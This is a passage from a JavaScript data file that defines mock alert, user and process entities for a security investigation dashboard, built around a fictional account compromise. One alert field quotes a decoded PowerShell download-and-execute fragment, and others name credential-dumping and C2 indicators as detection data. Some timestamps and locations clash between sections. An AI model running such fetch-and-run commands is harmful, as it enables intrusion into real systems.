/* ═══════════════════════════════════════════════════
 * entities.js — Entity definitions for Investigation Graph
 * Entity Types: alert, user, device, ip, service, process
 * ═══════════════════════════════════════════════════ */

const ENTITIES = {
  'alert-impossible-travel': {
    type: 'alert', modalTitle: 'Alert Details · Impossible Travel',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Impossible Travel',
          'Alert ID':'ALT-2026-05-11-00847',
          'Alert Source':'UEBA Engine',
          'Severity':'Critical',
          'Confidence':'92%',
          'Rule':'Geo-anomaly: login from 2 countries within 12 min',
          'MITRE ATT&CK':'Valid Accounts: Cloud (T1078.004)',
          'First Seen':'2025-06-04 09:32 UTC',
          'Status':'Open — Under Investigation',
          'Assigned To':'Unassigned',
          'Incident ID':'INC-2026-00142 (auto-created)',
          'Correlation':'3 related alerts linked'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: true,
        kv: {
          'Login 1':'10.18.1.81 — Austin, TX, USA — 09:20 UTC',
          'Login 2':'185.220.101.42 — Bucharest, Romania — 09:32 UTC',
          'Time Delta':'12 minutes',
          'Distance':'4,500 miles / 7,200 km',
          'Required Speed':'~22,500 mph (physically impossible)',
          'MFA Status':'Login 2 bypassed MFA via token replay',
          'User Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) — matches corporate agent',
          'Risk Score':'94 / 100'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: true,
        kv: {
          'User':'m.henderson (IT Support — Marketing Floor)',
          'Device':'CORP-WS-045 (Windows 11 Pro)',
          'Cloud Services':'Azure AD, SharePoint Online, Exchange Online',
          'External IP':'185.220.101.42 — Bucharest, Romania (Tor Exit Node)',
          'Internal IP':'10.18.1.81 — NYC Office',
          'OAuth Tokens':'2 active (1 suspicious scope)',
          'Processes':'powershell.exe, WinUpdateSvc (both suspicious)'
        }
      },
      correlatedAlerts: {
        label: 'Correlated Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:38:22', dot:'red', malicious: true,
            details: { 'Alert':'LAN ARP Spoofing — MITM', 'Source':'CORP-WS-045', 'Severity':'Critical', 'MITRE':'ARP Cache Poisoning (T1557.002)' } },
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            details: { 'Alert':'Suspicious Service Installed', 'Source':'CORP-WS-045', 'Severity':'High', 'MITRE':'Create/Modify System Process (T1543.003)' } },
          { time:'11 May 2026  10:37:01', dot:'red', malicious: true,
            details: { 'Alert':'Encoded PowerShell Execution', 'Source':'CORP-WS-045', 'Severity':'Critical', 'MITRE':'PowerShell (T1059.001)' } }
        ]
      },
      remediationGuide: {
        label: 'Recommendations & Remediation', expanded: false,
        remediationData: {
          verdict: 'True Positive — Active Credential Compromise',
          severity: 'critical',
          recommendations: [
            { icon:'�', title:'Verify Travel Legitimacy', desc:'Confirm with user/manager whether m.henderson actually traveled. Sequential Azure AD sign-ins from Austin (06:42, baseline) and Bucharest (09:56, Tor exit) — 9,400 km in 3 h 14 min, physically impossible.', priority:'Critical' },
            { icon:'🧩', title:'Assess MFA Bypass Method', desc:'Determine how the Bucharest session bypassed MFA. Was a token replayed? Was a session cookie stolen? Check Entra sign-in logs for auth method details.', priority:'High' },
            { icon:'📊', title:'Scope the Credential Exposure', desc:'Identify all resources accessed from the suspicious Bucharest session. Determine if OAuth tokens were issued, lateral movement occurred, or data was accessed.', priority:'High' }
          ],
          playbooks: [
            { name:'Impossible Travel Response', id:'PB-TRAVEL-001', desc:'Disable account → Block foreign IP → Revoke sessions → Reset credentials → Notify user', status:'Ready', estimatedTime:'3 min', urgency:'Run Immediate' }
          ]
        }
      }
    }
  },
  'alert-arp-spoofing-1': {
    type: 'alert', modalTitle: 'Alert Details · LAN ARP Spoofing (14:43)',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'LAN ARP Spoofing — MITM Attack',
          'Alert ID':'ALT-2026-05-11-00849',
          'Alert Source':'Correlation Engine',
          'Triggered At':'11 May 2026  09:43:10',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)',
          'Source Device':'CORP-WS-045',
          'Target':'Network Segment 10.18.1.0/24',
          'Detection Logic':'ARP reply storm from single MAC (>50 gratuitous ARP in 30s)',
          'Affected Users':'m.henderson, j.williams, s.chen (same subnet)',
          'Confidence':'96%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'COR-ARP-001 — ARP Spoofing / MITM',
          'Threshold':'> 20 gratuitous ARP replies within 60 seconds',
          'Actual':'54 gratuitous ARP replies in 28 seconds',
          'Source MAC':'00:1A:2B:3C:4D:5E (CORP-WS-045)',
          'Spoofed IP':'10.18.1.1 (Gateway)'
        }
      }
    }
  },
  'alert-arp-spoofing-2': {
    type: 'alert', modalTitle: 'Alert Details · LAN ARP Spoofing (14:41)',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'LAN ARP Spoofing — MITM Attack',
          'Alert ID':'ALT-2026-05-11-00848',
          'Alert Source':'Correlation Engine',
          'Triggered At':'11 May 2026  09:41:10',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1557.002 (ARP Cache Poisoning)',
          'Source Device':'CORP-WS-045',
          'Target':'Network Segment 10.18.1.0/24',
          'Detection Logic':'ARP reply storm from single MAC (>50 gratuitous ARP in 30s)',
          'Affected Users':'m.henderson (primary), j.williams',
          'Confidence':'94%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'COR-ARP-001 — ARP Spoofing / MITM',
          'Threshold':'> 20 gratuitous ARP replies within 60 seconds',
          'Actual':'48 gratuitous ARP replies in 32 seconds',
          'Source MAC':'00:1A:2B:3C:4D:5E (CORP-WS-045)',
          'Spoofed IP':'10.18.1.1 (Gateway)'
        }
      }
    }
  },
  'alert-oauth-token': {
    type: 'alert', modalTitle: 'Alert Details · Suspicious OAuth Token',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Suspicious OAuth Token — Broad Scope',
          'Alert ID':'ALT-2026-05-11-00850',
          'Alert Source':'Cloud Security Engine',
          'Triggered At':'11 May 2026  09:33:15',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1550.001 (Application Access Token)',
          'User':'m.henderson',
          'App':'FileSync Pro (unverified publisher)',
          'Scope':'Mail.ReadWrite, Files.ReadWrite.All, User.Read',
          'Source IP':'185.220.101.42 (Tor)',
          'Confidence':'89%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'CLD-OAUTH-002 — Broad Scope from Untrusted App',
          'Condition':'Unregistered app + Files.ReadWrite.All + risky IP',
          'User Self-Consented':'Yes ⚠',
          'Admin Consent':'No',
          'Publisher Verified':'No ✗'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'App':'FileSync Pro', 'Service':'Azure AD Portal', 'Token Type':'OAuth 2.0 Bearer', 'Process':'svc-oauth' }
      }
    }
  },
  'alert-app-consent': {
    type: 'alert', modalTitle: 'Alert Details · New App Consent',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'New App Consent — FileSync Pro',
          'Alert ID':'ALT-2026-05-11-00851',
          'Alert Source':'App Governance',
          'Triggered At':'11 May 2026  09:35:00',
          'Severity':'Medium',
          'Status':'Open',
          'MITRE ATT&CK':'T1098.003 (Additional Cloud Roles)',
          'User':'m.henderson',
          'App':'FileSync Pro',
          'Permissions':'Mail.ReadWrite, Files.ReadWrite.All',
          'Confidence':'78%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'GOV-APP-001 — User consent to unregistered app',
          'Condition':'App not in approved catalog + broad permissions',
          'Publisher':'Unverified',
          'First Seen':'11 May 2026 (same day as compromise)'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'Service':'Azure AD Portal', 'App':'FileSync Pro' }
      }
    }
  },
  'alert-enc-powershell': {
    type: 'alert', modalTitle: 'Alert Details · Encoded PowerShell Execution',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Encoded PowerShell Execution',
          'Alert ID':'ALT-2026-05-11-00852',
          'Alert Source':'EDR Engine',
          'Triggered At':'11 May 2026  10:36:22',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1059.001 (PowerShell)',
          'Device':'CORP-WS-045',
          'User':'m.henderson',
          'Process':'powershell.exe (PID: 4892)',
          'Command':'-nop -w hidden -encodedcommand ...',
          'Confidence':'97%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'EDR-PS-003 — Encoded + Hidden Window',
          'Flags':'-NoProfile, -WindowStyle Hidden, -EncodedCommand',
          'Decoded Content':'IEX (New-Object Net.WebClient).DownloadString(...)',
          'AMSI Result':'AMSI_RESULT_DETECTED (3 events)'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'User':'m.henderson', 'Process':'powershell.exe (PID 4892)', 'Parent Process':'powershell.exe (PID 3104)' }
      }
    }
  },
  'alert-sam-access': {
    type: 'alert', modalTitle: 'Alert Details · SAM Database Access',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'SAM Database Access Attempt',
          'Alert ID':'ALT-2026-05-11-00853',
          'Alert Source':'EDR Engine',
          'Triggered At':'11 May 2026  10:36:28',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1003 (OS Credential Dumping)',
          'Device':'CORP-WS-045',
          'User':'m.henderson',
          'Process':'powershell.exe (PID: 4892)',
          'Target':'C:\\Windows\\System32\\config\\SAM',
          'Confidence':'94%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'EDR-CRED-001 — SAM File Read',
          'Condition':'Non-SYSTEM process reading SAM hive',
          'Process Integrity':'Medium (not elevated)',
          'Mimikatz Indicators':'Invoke-Mimikatz detected via AMSI'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'User':'m.henderson', 'Process':'powershell.exe (PID 4892)', 'Credential Store':'SAM Database' }
      }
    }
  },
  'alert-c2-conn': {
    type: 'alert', modalTitle: 'Alert Details · Outbound C2 Connection',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Outbound Connection to Known C2',
          'Alert ID':'ALT-2026-05-11-00854',
          'Alert Source':'NDR Engine',
          'Triggered At':'11 May 2026  10:37:01',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1071 (Application Layer Protocol)',
          'Device':'CORP-WS-045',
          'Destination':'185.220.101.42:443 (Tor Exit Node)',
          'Process':'powershell.exe (PID: 4892)',
          'Protocol':'HTTPS',
          'Confidence':'96%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'NDR-C2-001 — Known C2 Infrastructure',
          'Threat Feed Match':'AbuseIPDB (98%), VirusTotal (12/89)',
          'Beacon Pattern':'60s interval, consistent payload size',
          'Domain':'c2-relay.onion.ws'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'User':'m.henderson', 'Process':'powershell.exe', 'Destination IP':'185.220.101.42', 'Service':'WinUpdateSvc (beacon)' }
      }
    }
  },
  'alert-sus-service': {
    type: 'alert', modalTitle: 'Alert Details · Suspicious Service Installed',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Suspicious Service Installed — WinUpdateSvc',
          'Alert ID':'ALT-2026-05-11-00855',
          'Alert Source':'EDR Engine',
          'Triggered At':'11 May 2026  10:36:22',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1543.003 (Create/Modify System Process)',
          'Device':'CORP-WS-045',
          'Service':'WinUpdateSvc',
          'Binary':'C:\\Windows\\Temp\\wuhelper.exe',
          'Signed':'No ⚠',
          'Confidence':'91%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'EDR-SVC-002 — Unsigned Service from Temp Path',
          'Condition':'New service + unsigned binary + temp directory',
          'Name Similarity':'wuauserv (Windows Update) — masquerading',
          'Created By':'powershell.exe via sc.exe create'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'Service':'WinUpdateSvc', 'Process':'powershell.exe (installer)', 'User':'m.henderson' }
      }
    }
  },
  'alert-tor-conn': {
    type: 'alert', modalTitle: 'Alert Details · Outbound Tor Connection',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Outbound Connection to Tor Exit Node',
          'Alert ID':'ALT-2026-05-11-00856',
          'Alert Source':'NDR Engine',
          'Triggered At':'11 May 2026  10:36:30',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1071 (Application Layer Protocol)',
          'Device':'CORP-WS-045',
          'Destination':'185.220.101.42:443',
          'Service':'WinUpdateSvc (wuhelper.exe)',
          'Confidence':'98%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'NDR-TOR-001 — Tor Exit Node Communication',
          'Condition':'Outbound HTTPS to known Tor exit',
          'Service':'WinUpdateSvc (masquerading)',
          'Interval':'60s beacon pattern'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'Service':'WinUpdateSvc', 'Destination IP':'185.220.101.42' }
      }
    }
  },
  'alert-data-exfil': {
    type: 'alert', modalTitle: 'Alert Details · Potential Data Exfiltration',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Potential Data Exfiltration via C2 Channel',
          'Alert ID':'ALT-2026-05-11-00857',
          'Alert Source':'DLP + NDR Correlation',
          'Triggered At':'11 May 2026  10:38:30',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1041 (Exfiltration Over C2 Channel)',
          'Device':'CORP-WS-045',
          'Data Volume':'248 MB via HTTP',
          'Destination':'91.215.85.12:8080',
          'Confidence':'93%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'DLP-EXFIL-003 — Large Outbound Transfer to Untrusted Host',
          'Threshold':'>100 MB to unknown destination',
          'Actual':'248 MB in single session',
          'Protocol':'HTTP (unencrypted) ⚠',
          'Source Process':'wuhelper.exe (WinUpdateSvc)'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'Device':'CORP-WS-045', 'Service':'WinUpdateSvc', 'Destination':'91.215.85.12:8080', 'Data Source':'SharePoint files staged locally' }
      }
    }
  },
  'alert-bulk-download': {
    type: 'alert', modalTitle: 'Alert Details · Bulk File Download',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Bulk File Download Detected',
          'Alert ID':'ALT-2026-05-11-00858',
          'Alert Source':'DLP Engine',
          'Triggered At':'11 May 2026  10:34:30',
          'Severity':'Critical',
          'Status':'Open',
          'MITRE ATT&CK':'T1530 (Data from Cloud Storage)',
          'User':'m.henderson',
          'Service':'SharePoint Online',
          'Files':'142 files in 4 minutes',
          'Data Volume':'2.3 GB',
          'Confidence':'95%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'DLP-SP-001 — Mass File Download',
          'Threshold':'>50 files in 10 minutes',
          'Actual':'142 files in 4 minutes',
          'Baseline':'8 files/day (peer average)',
          'Deviation':'17.75× above normal'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'Service':'SharePoint Online', 'Sites':'Finance-Reports, HR-Confidential, Project-Atlas' }
      }
    }
  },
  'alert-sensitive-access': {
    type: 'alert', modalTitle: 'Alert Details · Sensitive File Access',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Confidential File Accessed',
          'Alert ID':'ALT-2026-05-11-00859',
          'Alert Source':'DLP Engine',
          'Triggered At':'11 May 2026  10:35:00',
          'Severity':'High',
          'Status':'Open',
          'MITRE ATT&CK':'T1213.002 (Data from Information Repositories: SharePoint)',
          'User':'m.henderson',
          'Service':'SharePoint Online',
          'Files':'Q4-Revenue-Projections.xlsx, Employee-Compensation-2026.xlsx',
          'Labels':'Confidential — Finance, Highly Confidential — HR',
          'Confidence':'88%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'DLP-LABEL-002 — Access to Confidential-Labeled Files',
          'Condition':'Bulk access to files with Confidential sensitivity label',
          'Files Affected':'8 with sensitivity labels',
          'Classification':'PII + Financial data'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'m.henderson', 'Service':'SharePoint Online', 'Sites':'Finance-Reports, HR-Confidential' }
      }
    }
  },
  'alert-admin-offhours': {
    type: 'alert', modalTitle: 'Alert Details · Admin Off-Hours Login',
    sections: {
      alertDetails: {
        label: 'Alert Details', expanded: true,
        kv: {
          'Alert Name':'Admin Login Outside Business Hours',
          'Alert ID':'ALT-2026-05-09-00840',
          'Alert Source':'UEBA Engine',
          'Triggered At':'09 May 2026  21:15:00',
          'Severity':'Medium',
          'Status':'Resolved',
          'MITRE ATT&CK':'T1078 (Valid Accounts)',
          'User':'admin (Global Administrator)',
          'Device':'DC-01',
          'Source IP':'10.0.0.5',
          'Confidence':'62%'
        }
      },
      triggerConditions: {
        label: 'Trigger Conditions', expanded: false,
        kv: {
          'Rule':'UEBA-ADMIN-001 — Privileged Login Off-Hours',
          'Business Hours':'06:00 — 18:00 (Mon-Fri)',
          'Login Time':'21:15 (outside business hours)',
          'MFA':'Hardware token ✓',
          'Note':'Resolved — admin confirmed emergency maintenance'
        }
      },
      affectedEntities: {
        label: 'Affected Entities', expanded: false,
        kv: { 'User':'admin (Global Administrator)', 'Device':'DC-01', 'Source':'10.0.0.5' }
      }
    }
  },
  'user-m-henderson': {
    type: 'user', modalTitle: 'User Activity · m.henderson',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 94,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Compromised Account',
          metrics: [
            { icon:'⚠', label:'Anomalies (session / lifetime)', value:'7 / 47', color:'#DD1616' },
            { icon:'🔐', label:'Failed Logins (24h)', value:'4', color:'#FF5900' },
            { icon:'⏱', label:'Last Anomaly', value:'', color:'#6366B3', dynamic:'lastAnomaly' }
          ],
          // Hero chip: single honest field backed by ADSUserDetails.lastLogonTime (real DB column,
          // not retention-bounded). Replaces the prior 'First Seen / Last Activity' pair which was
          // sourced from ES min/max(@timestamp) and silently truncated by log retention.
          // See entity_data_mapping.md §1.1.
          heroChips: [
            { label:'Last Logon', value:'11 May 2026 09:41:10' }
          ],
          // Kept for back-compat with any consumer that still reads these directly.
          firstSeen: '11 May 2026 09:22:45',
          lastActivity: '11 May 2026 10:36:22',
          lastAnomaly: '11 May 2026 10:36:22'
        }
      },
      usersDetails: {
        label: 'User Details', expanded: true,
        kv: { 'Display Name':'m.henderson', 'SAM Account Name':'m.henderson', 'UPN':'m.henderson@contoso.com', 'Email':'m.henderson@corp.local', 'Job Title':'IT Support Engineer', 'Department':'IT', 'Manager':'j.williams (IT Manager)', 'Last Logon Time':'09:41:10', 'OU Name':'OU 1', 'Account Created':'2024-03-15', 'Account Status':'Active ⚠ (Recommended: Disable)', 'Logon Workstation':'CORP-WS-045', 'Primary Group':'Domain Users' }
      },
      logonActivity: {
        label: 'Logon Activity', expanded: true, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', details: { 'Logon Type':'Interactive (logon via keyboard/system)', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'11 May 2026  10:30:01', dot:'green', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.18.1.81', 'Status':'Success to DC' } },
          { time:'11 May 2026  10:28:05', dot:'orange', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.112.11.1', 'Status':'Failure' } }
        ],
        viewAllData: [
          { time:'11 May 2026  10:36:22', dot:'red', details: { 'Logon Type':'Interactive (logon via keyboard/system)', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'11 May 2026  10:30:01', dot:'green', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.18.1.81', 'Status':'Success to DC' } },
          { time:'11 May 2026  10:28:05', dot:'orange', details: { 'Logon Type':'Remote Interactive', 'Target Host':'CORP-SRV-01', 'Source IP':'10.112.11.1', 'Status':'Failure' } },
          { time:'11 May 2026  09:58:12', dot:'green', details: { 'Logon Type':'Network', 'Target Host':'CORP-FS-02', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'11 May 2026  09:22:45', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'11 May 2026  09:15:33', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'CORP-WS-045', 'Source IP':'192.168.1.22', 'Status':'Success' } },
          { time:'10 May 2026  17:45:00', dot:'green', details: { 'Logon Type':'Network', 'Target Host':'CORP-DC-01', 'Source IP':'10.18.1.81', 'Status':'Success' } }
        ]
      },
      processes: {
        label: 'Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'proc-powershell', label:'Powershell.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'powershell.exe', 'Parent process':'powershell.exe' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process powershell.exe…' } }
        ],
        viewAllData: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'proc-powershell', label:'Powershell.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'powershell.exe', 'Parent process':'powershell.exe' },
            action: { label:'⊘ Kill Process', type:'outline', toast:'Killing process powershell.exe…' } },
          { time:'11 May 2026  10:35:10', dot:'orange', viewOnGraph: { nodeId:'proc-cmd', label:'cmd.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'cmd.exe', 'Parent process':'explorer.exe' } },
          { time:'11 May 2026  09:20:00', dot:'green', viewOnGraph: { nodeId:'proc-outlook', label:'outlook.exe', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Process Name':'outlook.exe', 'Parent process':'explorer.exe' } }
        ]
      },
      serviceTriggered: {
        label: 'Service Triggered', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' },
            action: { label:'⊘ Stop Service', type:'outline', toast:'Stopping WinUpdateSvc service…' } },
          { time:'11 May 2026  09:30:01', dot:'orange', viewOnGraph: { nodeId:'svc-wuauserv', label:'wuauserv', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'wuauserv', 'Display name':'Windows Update', 'Startup type':'Manual', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Paused', 'Severity':'High' } },
          { time:'11 May 2026  09:42:03', dot:'green', viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' } }
        ],
        viewAllData: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true, viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' },
            action: { label:'⊘ Stop Service', type:'outline', toast:'Stopping WinUpdateSvc service…' } },
          { time:'11 May 2026  09:30:01', dot:'orange', viewOnGraph: { nodeId:'svc-wuauserv', label:'wuauserv', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'wuauserv', 'Display name':'Windows Update', 'Startup type':'Manual', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Paused', 'Severity':'High' } },
          { time:'11 May 2026  09:42:03', dot:'green', viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'WinUpdateSvc', 'Display name':'Windows Update Helper Service', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'AUTHORITY\\SYSTEM', 'Severity':'Installed' } },
          { time:'11 May 2026  10:15:22', dot:'green', viewOnGraph: { nodeId:'svc-spooler', label:'Spooler', icon:'⚙', sourceEntity:'user-m-henderson' },
            details: { 'Service Name':'Spooler', 'Display name':'Print Spooler', 'Startup type':'Automatic', 'host':'NT AUTHORITY\\SYSTEM', 'Status':'Running', 'Severity':'Normal' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  09:38:22', dot:'red',
            viewOnGraph: { nodeId:'alert-arp-spoofing-1', label:'ARP Spoofing Alert', icon:'🔔', sourceEntity:'user-m-henderson' },
            alertProfileId: 'alert-arp-spoofing-1',
            detailsGrid: [
              { label:'09:43:10 LAN ARP Spoofing', value:'MiTM Attack', tag:'Type', tagVal:'CORRELATION', mitre:'T1557.002 (ARP Cache Poisoning)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'11 May 2026  09:39:01', dot:'red',
            viewOnGraph: { nodeId:'alert-arp-spoofing-2', label:'ARP Spoofing Alert', icon:'🔔', sourceEntity:'user-m-henderson' },
            alertProfileId: 'alert-arp-spoofing-2',
            detailsGrid: [
              { label:'09:41:10 LAN ARP Spoofing', value:'MiTM Attack', tag:'Type', tagVal:'CORRELATION', mitre:'T1557.002 (ARP Cache Poisoning)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      },
      resourceFileAccess: {
        label: 'Resource and file access', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:34:18', dot:'red', malicious: true,
            details: { 'Host':'CORP-WS-045', 'File Name':'Q4_Revenue_Forecast.xlsx', 'Location':'SharePoint:/Finance/Sensitive', 'Change Type':'Downloaded' } },
          { time:'11 May 2026  10:33:45', dot:'red', malicious: true,
            details: { 'Host':'CORP-WS-045', 'File Name':'Employee_Salary_Data.csv', 'Location':'SharePoint:/HR/Restricted', 'Change Type':'Downloaded' } },
          { time:'11 May 2026  10:32:10', dot:'orange',
            details: { 'Host':'CORP-WS-045', 'File Name':'Board_Meeting_Notes.docx', 'Location':'SharePoint:/Executive/Private', 'Change Type':'Downloaded' } },
          { time:'11 May 2026  10:30:55', dot:'red', malicious: true,
            details: { 'Host':'CORP-WS-045', 'File Name':'vendor_contracts_2026.pdf', 'Location':'SharePoint:/Legal/Contracts', 'Change Type':'Downloaded' } },
          { time:'11 May 2026  10:28:02', dot:'orange',
            details: { 'Host':'CORP-WS-045', 'File Name':'network_topology.vsdx', 'Location':'c:\\IT\\Diagrams', 'Change Type':'Accessed' } },
          { time:'11 May 2026  09:38:22', dot:'green',
            details: { 'Host':'CORP-WS-045', 'File Name':'financial_records.txt', 'Location':'c:\\restricted share\\secret', 'Change Type':'Created' } }
        ]
      },
      uebaProfile: {
        label: 'UEBA Risk Profile', expanded: false,
        kv: {
          'Risk Score':'94 / 100 — Critical',
          'Anomalies Detected':'7',
          'Account Type':'Standard User (No admin privileges)'
        }
      },
      loginStatistics: {
        label: 'Login Statistics (7 days)', expanded: false,
        kv: {
          'Total Logins':'47',
          'Successful':'43 (91.5%)',
          'Failed':'4 (8.5%)',
          'Unique Source IPs':'3 (192.168.1.22, 10.18.1.81, 10.112.11.1)',
          'Off-Hours Logins':'2',
          'Unique Hosts':'3 (CORP-WS-045, CORP-SRV-01, CORP-FS-02)'
        }
      },
      cloudIdentities: {
        label: 'Cloud Identities & Assets', expanded: false,
        kv: {
          'Azure AD':'m.henderson@contoso.com — Entra ID P2',
          'Azure Roles':'User (no privileged roles)',
          'Conditional Access':'3 policies applied',
          'M365 License':'E5 (Exchange, SharePoint, Teams)'
        }
      },
      identityRisk: {
        label: 'Identity Risk Assessment', expanded: false,
        kv: {
          'Password Age':'142 days (policy: 90 days) ⚠',
          'Group Memberships':'Domain Users, IT-Support, VPN-Users, SharePoint-Editors',
